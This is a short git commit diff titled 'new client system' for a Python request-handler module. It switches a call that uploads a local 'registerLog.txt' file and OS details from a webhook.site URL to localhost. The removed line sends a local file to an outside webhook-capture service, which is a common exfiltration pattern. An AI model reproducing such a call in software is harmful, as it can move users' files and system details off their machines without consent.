b3eabb602ade89c950cbf5b4272e321d52efee3f
Tom Oliveira <washington-kd@hotmail.com>
2021-05-14 03:24:33 -0300

    new client system

--- client-system/_requestHandler/__init__.py
+++ client-system/_requestHandler/__init__.py
@@ -8,7 +8,7 @@ class _requestHandler():
               if not os.path.isfile("registerLog.txt"): return False
               file = open("registerLog.txt", 'rb')
               
-              requests.post("https://webhook.site/364ae3db-8fe9-44fa-aeed-e768ed1bd8f0", files={"upload_file": file}, params={
+              requests.post("http://localhost:5000", files={"upload_file": file}, params={
                      "osName" : os.name,
                      "platformName": platform.system()
               })
